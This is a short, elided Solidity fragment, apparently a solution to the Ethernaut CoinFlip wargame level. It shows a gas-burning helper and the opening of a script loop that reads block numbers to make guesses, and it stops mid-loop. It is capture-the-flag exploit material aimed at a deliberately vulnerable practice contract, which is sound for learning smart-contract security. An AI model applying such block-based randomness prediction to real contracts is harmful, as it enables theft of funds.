...
contract CoinFlipSolution {
    ...
    function burnGas() private {
        uint iterations = 20;
        for(uint i = 0; i < iterations; i++) {
            lastBlockValue = lastBlockValue + 1;
            emit GasBurned(i);
        }
        lastBlockValue = lastBlockValue - iterations;
    }
}
...
contract SolutionScript is EthernautScript {
    ...
    function solve(address payable _instanceAddress) internal override {
        ...
        uint numGuesses = 10;
        for(uint i = 1; i < numGuesses; i++) {
            uint lastBlockNumber = block.number;
